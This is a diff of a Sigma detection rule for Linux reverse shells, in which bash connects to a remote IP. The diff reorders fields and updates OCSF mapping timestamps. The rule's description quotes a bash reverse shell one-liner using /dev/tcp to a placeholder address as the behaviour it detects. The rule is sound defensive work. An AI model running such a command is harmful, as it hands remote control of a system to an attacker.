@@ -1,20 +1,19 @@
-id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
 title: Linux Reverse Shell Indicator
+id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
 status: test
 level: critical
+author: Florian Roth (Nextron Systems)
 description: Detects a bash contecting to a remote IP address (often found when actors
     do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
-author: Florian Roth (Nextron Systems)
-date: '2021-10-16'
-modified: '2022-12-25'
-tags:
-    - attack.execution
-    - attack.t1059.004
 references:
     - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 falsepositives:
     - Unknown
-taxonomy: sigma
+tags:
+    - attack.execution
+    - attack.t1059.004
+date: '2021-10-16'
+modified: '2022-12-25'
 logsource:
     category: network_connection
     product: linux
@@ -33,17 +32,17 @@ ocsf_mapping:
         category:
             source_field: category
             source_value: network_connection
-            mapped_at: '2025-11-26T02:17:54.460561+00:00'
+            mapped_at: '2025-12-04T01:36:55.799077+00:00'
         product:
             source_field: product
             source_value: linux
-            mapped_at: '2025-11-26T02:17:54.460561+00:00'
+            mapped_at: '2025-12-04T01:36:55.799077+00:00'
     detection_fields:
         -   source_field: Image
             target_table: network_activity
             target_field: <UNMAPPED>
-            mapped_at: '2025-11-26T02:17:57.319409+00:00'
+            mapped_at: '2025-12-04T01:36:55.799091+00:00'
         -   source_field: DestinationIp
             target_table: network_activity
             target_field: dst_endpoint.ip
-            mapped_at: '2025-11-26T02:17:57.319448+00:00'
+            mapped_at: '2025-12-04T01:36:55.799093+00:00'
